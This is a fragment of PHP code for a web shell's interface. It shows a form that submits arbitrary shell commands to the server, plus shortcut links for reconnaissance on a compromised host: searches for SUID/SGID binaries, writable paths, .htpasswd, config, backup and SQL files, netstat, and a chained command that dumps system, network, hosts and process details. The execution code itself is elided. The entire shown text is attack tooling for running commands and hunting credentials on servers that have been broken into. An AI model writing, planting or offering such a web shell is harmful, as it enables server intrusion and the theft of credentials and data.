...
echo '<body onload="document.getElementById(\'inp\').focus();">';
    echo '<div id="cmdOutput">';
    ...
    echo '<form method="POST" id="form">';
        ...
        echo "└─── $sep ";
        echo '<input type="text" name="cmd" id="inp" value="'.htmlspecialchars($_POST['cmd']).'"> <input type="submit" value="run..." class="btn">';

        echo '<div id="shortcuts">
            <small>
                <a href="?cmd='.urlencode("find / -type f -perm -04000 -ls").'">Find SUID files</a> |
                <a href="?cmd='.urlencode("find / -type f -perm -02000 -ls").'">Find SGID files</a> |
                <a href="?cmd='.urlencode("find / -type f -iname \"*config*\"").'">Find *config*</a> |
                <a href="?cmd='.urlencode("find / -perm -2 -ls").'">Find writeable dirs and files</a> |
                <a href="?cmd='.urlencode("find / -name .htaccess").'">Find .htaccess</a> |
                <a href="?cmd='.urlencode("find / -name .htpasswd").'">Find .htpasswd</a> |
                <a href="?cmd='.urlencode("find / -iname \"*.bak\"").'">Find *.bak</a> |
                <a href="?cmd='.urlencode("find / -iname \"*.sql\"").'">Find *.sql</a> |
                <a href="?cmd='.urlencode("netstat -a").'">Netstat</a> |
                <a href="?cmd='.urlencode('id; echo " "; echo "-----------------------------------------------"; echo " "; uname -a; echo " "; lscpu; echo " "; lsmod; echo " "; echo "-----------------------------------------------"; echo " "; df -h; echo " "; mount; echo " "; lsblk; echo " "; cat /proc/partitions; echo " "; echo "-----------------------------------------------"; echo " "; free -h; echo " "; cat /proc/meninfo; echo " "; echo "-----------------------------------------------"; echo " "; lshw; hwinfo --short; echo " "; echo "-----------------------------------------------"; echo " "; ifconfig -a; echo " "; echo "RESOLV.CONF:"; cat /etc/resolv.conf; echo " "; echo "HOSTS-FILE:"; cat /etc/hosts; echo " "; echo "-----------------------------------------------"; echo " "; ps -aux | egrep -v "uname.*lscpu"; echo " "; echo "-----------------------------------------------"; echo " ";').'">Sysinfo</a>
            </small>
        </div>
    </form>
</body>
